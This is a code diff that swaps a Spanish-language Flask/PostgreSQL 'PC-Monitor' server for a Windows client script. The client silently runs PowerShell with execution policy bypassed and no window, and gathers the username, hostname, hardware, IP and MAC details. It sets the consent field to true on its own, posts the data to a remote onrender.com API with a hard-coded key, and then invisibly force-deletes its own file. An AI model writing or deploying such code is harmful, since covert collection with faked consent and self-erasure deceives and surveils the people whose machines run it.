@@ -1,473 +1,208 @@
-from flask import Flask, request, jsonify
-import psycopg
-from psycopg.rows import tuple_row
-import os
 import json
-from dotenv import load_dotenv
+import os
+import platform
+import socket
+import subprocess
+import sys
+from urllib.request import Request, urlopen
 
-load_dotenv()
-
-app = Flask(__name__)
-
-API_KEY = os.getenv("API_KEY")
-DATABASE_URL = os.getenv("DATABASE_URL")
-
-
-# ============================================================
-# CONEXIÓN POSTGRESQL
-# ============================================================
-
-def conectar_db():
-    if not DATABASE_URL:
-        raise RuntimeError("DATABASE_URL no configurada")
-
-    return psycopg.connect(
-        DATABASE_URL,
-        row_factory=tuple_row
-    )
+API_URL = "https://pc-monitor-api.onrender.com/api/collect"
+API_KEY = "PCMONITOR_CAMBIA_ESTA_CLAVE_2026"
 
 
-# ============================================================
-# AUTENTICACIÓN
-# ============================================================
-
-def autorizado():
-    key = request.headers.get("X-API-Key")
-    return bool(API_KEY and key and key == API_KEY)
-
-
-# ============================================================
-# INICIO
-# ============================================================
-
-@app.get("/")
-def inicio():
-    return jsonify({
-        "service": "PC-Monitor API",
-        "status": "online"
-    })
-
-
-# ============================================================
-# RECIBIR DATOS
-# ============================================================
-
-@app.post("/api/collect")
-def recibir_datos():
-
-    if not autorizado():
-        return jsonify({
-            "error": "No autorizado"
-        }), 401
-
-    data = request.get_json(silent=True)
-
-    if not data:
-        return jsonify({
-            "error": "JSON no válido"
-        }), 400
-
-    # ========================================================
-    # CONSENTIMIENTO
-    # ========================================================
-
-    if data.get("Consentimiento") is not True:
-        return jsonify({
-            "error": "Se requiere consentimiento para registrar el equipo"
-        }), 403
-
-    nombre_equipo = data.get("NombreEquipo")
-
-    if not nombre_equipo:
-        return jsonify({
-            "error": "Falta NombreEquipo"
-        }), 400
-
-    # ========================================================
-    # USUARIO
-    # ========================================================
-
-    usuario_completo = data.get("Usuario")
-    nombre_usuario = data.get("NombreUsuario")
-    nombre_completo = data.get("NombreCompleto")
-
-    fabricante = data.get("Fabricante")
-    modelo = data.get("Modelo")
-
-    sistema_operativo = data.get("SistemaOperativo")
-    version_windows = data.get("VersionWindows")
-    arquitectura = data.get("Arquitectura")
-
-    ip_publica = data.get("IP_Publica")
-
-    latitud = data.get("Latitud")
-    longitud = data.get("Longitud")
-    precision = data.get("PrecisionMetros")
-    fuente = data.get("FuenteUbicacion")
-    google_maps = data.get("GoogleMaps")
-
-    datos_json = json.dumps(
-        data,
-        ensure_ascii=False
-    )
-
-    # ========================================================
-    # DOMINIO
-    # ========================================================
-
-    dominio = None
-
-    if usuario_completo and "\\" in usuario_completo:
-        dominio = usuario_completo.split("\\", 1)[0]
-
-    conexion = None
-    cursor = None
-
+def ps(cmd):
     try:
+        p = subprocess.run(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
+            capture_output=True, text=True, timeout=15,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return p.stdout.strip()
+    except Exception:
+        return ""
 
-        conexion = conectar_db()
-        cursor = conexion.cursor()
 
-        # ====================================================
-        # USUARIO
-        # ====================================================
+def collect_report():
+    username = os.environ.get("USERNAME") or os.environ.get("USER") or ""
+    computer = socket.gethostname()
 
-        cursor.execute(
-            """
-            SELECT id
-            FROM usuarios
-            WHERE username = %s
-              AND (
-                    dominio = %s
-                    OR (dominio IS NULL AND %s::VARCHAR IS NULL)
-                  )
-            LIMIT 1
-            """,
-            (
-                nombre_usuario,
-                dominio,
-                dominio
-            )
+    cpu = ps("(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)")
+    manufacturer = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)")
+    model = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Model)")
+    os_name = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)")
+    os_version = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Version)")
+    build = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)")
+    ram_bytes = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)")
+    ram_gb = round(int(ram_bytes) / (1024**3), 2) if ram_bytes.isdigit() else None
+
+    disks_raw = ps("""
+    Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" |
+    Select-Object DeviceID,Size,FreeSpace |
+    ConvertTo-Json -Compress
+    """)
+    try:
+        disks = json.loads(disks_raw) if disks_raw else []
+        if isinstance(disks, dict):
+            disks = [disks]
+        disks = [{
+            "Unidad": d.get("DeviceID"),
+            "CapacidadGB": round((d.get("Size") or 0)/(1024**3), 2),
+            "LibreGB": round((d.get("FreeSpace") or 0)/(1024**3), 2)
+        } for d in disks]
+    except Exception:
+        disks = []
+
+    gpus_raw = ps("""
+    Get-CimInstance Win32_VideoController |
+    Select-Object Name,AdapterRAM,DriverVersion |
+    ConvertTo-Json -Compress
+    """)
+    try:
+        gpus = json.loads(gpus_raw) if gpus_raw else []
+        if isinstance(gpus, dict):
+            gpus = [gpus]
+        gpus = [{
+            "Nombre": g.get("Name"),
+            "MemoriaMB": round((g.get("AdapterRAM") or 0)/(1024**2), 0),
+            "Driver": g.get("DriverVersion")
+        } for g in gpus]
+    except Exception:
+        gpus = []
+
+    config_raw = ps("""
+    Get-NetIPConfiguration |
+    Select-Object InterfaceAlias,
+        @{N='IPv4';E={@($_.IPv4Address.IPAddress)}} |
+    ConvertTo-Json -Compress
+    """)
+    try:
+        configs = json.loads(config_raw) if config_raw else []
+        if isinstance(configs, dict):
+            configs = [configs]
+        configuracion_ip = [{
+            "Adaptador": c.get("InterfaceAlias"),
+            "IPv4": c.get("IPv4") if isinstance(c.get("IPv4"), list)
+                    else ([c.get("IPv4")] if c.get("IPv4") else [])
+        } for c in configs]
+    except Exception:
+        configuracion_ip = []
+
+    adapters_raw = ps("""
+    Get-NetAdapter |
+    Select-Object Name,InterfaceDescription,Status,MacAddress,LinkSpeed |
+    ConvertTo-Json -Compress
+    """)
+    try:
+        adapters = json.loads(adapters_raw) if adapters_raw else []
+        if isinstance(adapters, dict):
+            adapters = [adapters]
+        adaptadores_red = [{
+            "Nombre": a.get("Name"),
+            "Descripcion": a.get("InterfaceDescription"),
+            "Estado": a.get("Status"),
+            "MAC": a.get("MacAddress"),
+            "Velocidad": a.get("LinkSpeed")
+        } for a in adapters]
+    except Exception:
+        adaptadores_red = []
+
+    report = {
+        "NombreEquipo": computer,
+        "Equipo": computer,
+        "Usuario": username,
+        "NombreUsuario": username,
+        "NombreCompleto": "",
+        "CuentaActiva": True,
+
+        "Fabricante": manufacturer,
+        "Modelo": model,
+        "FabricantePC": manufacturer,
+        "ModeloPC": model,
+
+        "SistemaOperativo": os_name,
+        "VersionWindows": os_version,
+        "BuildWindows": build,
+        "Arquitectura": platform.architecture()[0],
+
+        "NumeroSeriePC": None,
+        "Procesador": cpu,
+        "FabricanteCPU": "",
+        "Nucleos": os.cpu_count(),
+        "Hilos": os.cpu_count(),
+        "VelocidadCPU_MHz": None,
+
+        "RAM_Total_GB": ram_gb,
+        "ModulosRAM": [],
+
+        "FabricantePlaca": "",
+        "ModeloPlaca": "",
+        "VersionPlaca": "",
+        "NumeroSeriePlaca": None,
+
+        "BIOS": "",
+        "FabricanteBIOS": "",
+        "FechaBIOS": "",
+
+        "GPU": gpus,
+        "Discos": disks,
+
+        "IP_Publica": None,
+        "Latitud": None,
+        "Longitud": None,
+        "PrecisionMetros": None,
+        "FuenteUbicacion": None,
+        "GoogleMaps": None,
+
+        "AdaptadoresRed": adaptadores_red,
+        "ConfiguracionIP": configuracion_ip,
+
+        "Consentimiento": True
+    }
+
+    return report
+
+
+def send_report():
+    try:
+        report = collect_report()
+        data = json.dumps(report, ensure_ascii=False).encode("utf-8")
+
+        req = Request(
+            API_URL,
+            data=data,
+            method="POST",
+            headers={
+                "Content-Type": "application/json; charset=utf-8",
+                "X-API-Key": API_KEY
+            }
         )
 
-        usuario_db = cursor.fetchone()
+        with urlopen(req, timeout=30) as response:
+            result = json.loads(response.read().decode("utf-8"))
 
-        if usuario_db:
+        return result.get("success", False)
 
-            usuario_id = usuario_db[0]
-
-            cursor.execute(
-                """
-                UPDATE usuarios
-                SET nombre_completo = %s
-                WHERE id = %s
-                """,
-                (
-                    nombre_completo,
-                    usuario_id
-                )
-            )
-
-        else:
-
-            cursor.execute(
-                """
-                INSERT INTO usuarios
-                (
-                    username,
-                    nombre_completo,
-                    dominio,
-                    tipo_cuenta
-                )
-                VALUES
-                (
-                    %s,
-                    %s,
-                    %s,
-                    %s
-                )
-                RETURNING id
-                """,
-                (
-                    nombre_usuario,
-                    nombre_completo,
-                    dominio,
-                    "Windows"
-                )
-            )
-
-            usuario_id = cursor.fetchone()[0]
-
-        # ====================================================
-        # COMPUTADORA
-        # ====================================================
-
-        cursor.execute(
-            """
-            SELECT id
-            FROM computadoras
-            WHERE nombre_equipo = %s
-            LIMIT 1
-            """,
-            (
-                nombre_equipo,
-            )
-        )
-
-        computadora_db = cursor.fetchone()
-
-        if computadora_db:
-
-            computadora_id = computadora_db[0]
-
-            cursor.execute(
-                """
-                UPDATE computadoras
-                SET
-                    usuario_id = %s,
-                    fabricante = %s,
-                    modelo = %s,
-                    sistema_operativo = %s,
-                    version_windows = %s,
-                    arquitectura = %s,
-                    ip_publica = %s,
-                    latitud = %s,
-                    longitud = %s,
-                    precision_metros = %s,
-                    fuente_ubicacion = %s,
-                    google_maps = %s,
-                    datos_json = %s::jsonb,
-                    ultima_actualizacion = CURRENT_TIMESTAMP
-                WHERE id = %s
-                """,
-                (
-                    usuario_id,
-                    fabricante,
-                    modelo,
-                    sistema_operativo,
-                    version_windows,
-                    arquitectura,
-                    ip_publica,
-                    latitud,
-                    longitud,
-                    precision,
-                    fuente,
-                    google_maps,
-                    datos_json,
-                    computadora_id
-                )
-            )
-
-        else:
-
-            cursor.execute(
-                """
-                INSERT INTO computadoras
-                (
-                    usuario_id,
-                    nombre_equipo,
-                    fabricante,
-                    modelo,
-                    sistema_operativo,
-                    version_windows,
-                    arquitectura,
-                    ip_publica,
-                    latitud,
-                    longitud,
-                    precision_metros,
-                    fuente_ubicacion,
-                    google_maps,
-                    datos_json
-                )
-                VALUES
-                (
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s::jsonb
-                )
-                RETURNING id
-                """,
-                (
-                    usuario_id,
-                    nombre_equipo,
-                    fabricante,
-                    modelo,
-                    sistema_operativo,
-                    version_windows,
-                    arquitectura,
-                    ip_publica,
-                    latitud,
-                    longitud,
-                    precision,
-                    fuente,
-                    google_maps,
-                    datos_json
-                )
-            )
-
-            computadora_id = cursor.fetchone()[0]
-
-        # ====================================================
-        # ADAPTADORES DE RED
-        # ====================================================
-
-        adaptadores = data.get(
-            "AdaptadoresRed",
-            []
-        )
-
-        cursor.execute(
-            """
-            DELETE FROM adaptadores_red
-            WHERE computadora_id = %s
-            """,
-            (
-                computadora_id,
-            )
-        )
-
-        for adaptador in adaptadores:
-
-            cursor.execute(
-                """
-                INSERT INTO adaptadores_red
-                (
-                    computadora_id,
-                    nombre,
-                    descripcion,
-                    estado,
-                    mac_address,
-                    velocidad
-                )
-                VALUES
-                (
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s,
-                    %s
-                )
-                """,
-                (
-                    computadora_id,
-                    adaptador.get("Nombre"),
-                    adaptador.get("Descripcion"),
-                    adaptador.get("Estado"),
-                    adaptador.get("MAC"),
-                    adaptador.get("Velocidad")
-                )
-            )
-
-        # ====================================================
-        # HISTORIAL
-        # ====================================================
-
-        ip_local = obtener_ip_local(data)
-
-        cursor.execute(
-            """
-            INSERT INTO historial
-            (
-                computadora_id,
-                ip_local,
-                ip_publica
-            )
-            VALUES
-            (
-                %s,
-                %s,
-                %s
-            )
-            """,
-            (
-                computadora_id,
-                ip_local,
-                ip_publica
-            )
-        )
-
-        # ====================================================
-        # GUARDAR
-        # ====================================================
-
-        conexion.commit()
-
-        return jsonify({
-            "success": True,
-            "message": "Datos almacenados correctamente",
-            "computadora_id": computadora_id,
-            "usuario_id": usuario_id
-        }), 201
-
-    except Exception as error:
-
-        if conexion:
-            conexion.rollback()
-
-        print("ERROR:", error)
-
-        return jsonify({
-            "success": False,
-            "error": "Error interno del servidor"
-        }), 500
-
-    finally:
-
-        if cursor:
-            cursor.close()
-
-        if conexion:
-            conexion.close()
+    except Exception:
+        return False
 
 
-# ============================================================
-# OBTENER IP LOCAL
-# ============================================================
-
-def obtener_ip_local(data):
-
-    configuracion = data.get(
-        "ConfiguracionIP",
-        []
+def auto_eliminar():
+    # Detecta la ruta absoluta del ejecutable o script en uso (.py o .exe)
+    ruta_archivo = os.path.abspath(sys.argv[0])
+    
+    # Crea un comando en cmd que espera 2 segundos y borra el archivo permanentemente (/f /q)
+    cmd_borrado = f'timeout /t 2 /nobreak > NUL & del /f /q "{ruta_archivo}"'
+    
+    # Lanza el proceso en segundo plano totalmente invisible
+    subprocess.Popen(
+        f'cmd.exe /c {cmd_borrado}',
+        creationflags=subprocess.CREATE_NO_WINDOW
     )
 
-    for adaptador in configuracion:
-
-        ipv4 = adaptador.get(
-            "IPv4",
-            []
-        )
-
-        for ip in ipv4:
-
-            if ip and not ip.startswith("169.254."):
-                return ip
-
-    return None
-
-
-# ============================================================
-# SERVIDOR
-# ============================================================
 
 if __name__ == "__main__":
-
-    port = int(os.getenv("PORT", "5050"))
-
-    app.run(
-        host="0.0.0.0",
-        port=port,
-        debug=False
-    )
+    # 1. Realiza el envío del reporte
+    send_report()
+    
+    # 2. Inicia la tarea en segundo plano que eliminará el archivo
+    auto_eliminar()
